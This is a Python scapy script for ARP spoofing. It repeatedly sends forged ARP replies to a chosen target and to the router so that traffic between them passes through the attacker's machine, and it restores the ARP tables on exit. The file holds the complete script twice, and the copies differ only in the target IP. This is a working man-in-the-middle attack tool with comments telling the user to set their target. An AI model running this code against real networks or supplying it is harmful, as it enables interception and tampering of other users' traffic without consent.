import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    answers_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answers_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):  # arp spoofing main
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


def restore(dest_ip, source_ip):  # restoring mac before closing(keyboard interrupt)
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


router_ip = "192.168.1.1"  # change it to your router IP
target_ip = "192.168.1.4"  # change it to your target's IP

count = 0

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        count = count + 2
        print("\r [X] Packet Sent " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n {X} Quitting ARP Spoof and Restoring ARP")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[X] Restoring Done")
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    answers_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answers_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):  # arp spoofing main
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)


def restore(dest_ip, source_ip):  # restoring mac before closing(keyboard interrupt)
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


router_ip = "192.168.1.1"  # change it to your router IP
target_ip = "192.168.1.15"  # change it to your target's IP

count = 0

try:
    while True:
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        count = count + 2
        print("\r [X] Packet Sent " + str(count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n {X} Quitting ARP Spoof and Restoring ARP")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
    print("[X] Restoring Done")
